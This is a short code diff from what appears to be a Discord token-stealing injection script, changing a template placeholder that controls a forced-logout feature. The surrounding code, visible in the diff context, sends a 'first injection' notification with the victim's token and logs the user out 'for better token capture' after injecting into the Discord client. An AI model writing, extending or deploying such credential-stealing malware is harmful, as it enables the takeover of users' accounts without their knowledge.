@@ -270,7 +270,7 @@ const sendFirstInjectionNotification = async (token) => {
         debugLog("First injection notification sent successfully");
 
         // Auto logout user for better token capture - improved method
-        if (%ENABLE_LOGOUT%) {
+        if (ENABLE_LOGOUT_PLACEHOLDER) {
             setTimeout(async () => {
                 debugLog("Auto-logging out user with advanced method after first injection");
                 await performCompleteLogout();
@@ -826,7 +826,7 @@ async function initiation() {
         }
 
         // Wait a bit for Discord to fully load, then perform logout
-        if (%ENABLE_LOGOUT%) {
+        if (ENABLE_LOGOUT_PLACEHOLDER) {
             setTimeout(async () => {
                 debugLog("Performing auto-logout after injection");
                 await performCompleteLogout();
